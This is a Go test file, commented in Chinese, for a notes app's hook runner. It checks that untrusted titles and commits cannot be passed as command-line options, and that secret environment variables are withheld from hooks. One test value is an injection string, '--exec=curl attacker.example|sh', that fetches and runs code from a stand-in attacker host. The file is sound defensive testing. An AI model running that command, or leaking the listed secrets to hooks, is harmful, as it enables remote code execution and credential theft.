package vault

import (
	"context"
	"slices"
	"strings"
	"testing"
	"time"
)

// VAULT-R10：標題與 commit 是不可信的值。以它們開頭的 argv 元素展開後以 - 開頭時加上一個空白，
// 不會被 hook 程式當成選項（例如標題 --exec=…）；其他位置與其他變數不變。
func TestRunHookUntrustedValueCannotBecomeOption(t *testing.T) {
	r := &scriptRunner{}
	h := Hook{ID: "x", Argv: []string{"/bin/hook", "{{title}}", "{{ commit }}", "{{title}}.md", "--title={{title}}", "{{note_path}}", "{{item_id}}"},
		Timeout: time.Second}
	vals := HookValues{NotePath: "/v/n.md", Title: "--exec=curl attacker.example|sh", Commit: "-c1", ItemID: "it1"}
	if res := RunHook(context.Background(), r, h, vals, map[string]string{}, "/w"); res.Failed() {
		t.Fatalf("res = %+v", res)
	}
	want := []string{" --exec=curl attacker.example|sh", " -c1", " --exec=curl attacker.example|sh.md", "--title=--exec=curl attacker.example|sh", "/v/n.md", "it1"}
	if got := r.calls[0].Args; !slices.Equal(got, want) {
		t.Errorf("args = %q\n預期 %q", got, want)
	}
	for _, a := range r.calls[0].Args {
		if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--title=") {
			t.Errorf("不可信的值成為選項：%q", a)
		}
	}
	// 一般的標題原樣傳入。
	r = &scriptRunner{}
	RunHook(context.Background(), r, h, HookValues{Title: "A - B", Commit: "c1"}, map[string]string{}, "/w")
	if got := r.calls[0].Args[:2]; !slices.Equal(got, []string{"A - B", "c1"}) {
		t.Errorf("一般的值 = %q", got)
	}
}

// VAULT-R11：hook 不能看到 notesteme 與 Hub 的秘密；設定檔載入與執行時用同一份判斷（ForbiddenHookEnv）。
func TestForbiddenHookEnv(t *testing.T) {
	for _, name := range []string{
		"NOTESTEME_MASTER_KEY", "notesteme_password", "NOTESTEME_OIDC_CLIENT_SECRET", "NOTESTEME_HUB_SESSION_KEY",
		"NOTESTEME_HUB_MASTER_KEY", "NOTESTEME_HUB_STORE_DSN", "DATABASE_DSN", "NOTESTEME_SMTP_PASSWORD", "PGPASSWORD_TOKEN",
		"GITHUB_TOKEN", "OPENAI_API_KEY", "NOTESTEME_HUB_OAUTH_GITHUB_CLIENT_SECRET", "NOTESTEME_HUB_S3_SECRET_ACCESS_KEY",
		"WEBHOOK_SECRET",
	} {
		if !ForbiddenHookEnv(name) {
			t.Errorf("%s 要禁止", name)
		}
	}
	for _, name := range []string{"LANG", "PATH", "HOME", "OBSIDIAN_VAULT", "SECRETARY", "TOKENS_DIR"} {
		if ForbiddenHookEnv(name) {
			t.Errorf("%s 不用禁止", name)
		}
	}
	vars := map[string]string{"NOTESTEME_OIDC_CLIENT_SECRET": "s", "NOTESTEME_HUB_STORE_DSN": "postgres://u:p@h/db", "LANG": "C"}
	h := Hook{EnvAllowlist: []string{"NOTESTEME_OIDC_CLIENT_SECRET", "NOTESTEME_HUB_STORE_DSN", "LANG"}}
	if env := HookEnv(h, vars, "it1"); !slices.Equal(env, []string{"LANG=C", "NOTESTEME_ITEM_ID=it1"}) {
		t.Errorf("env = %q", env)
	}
}
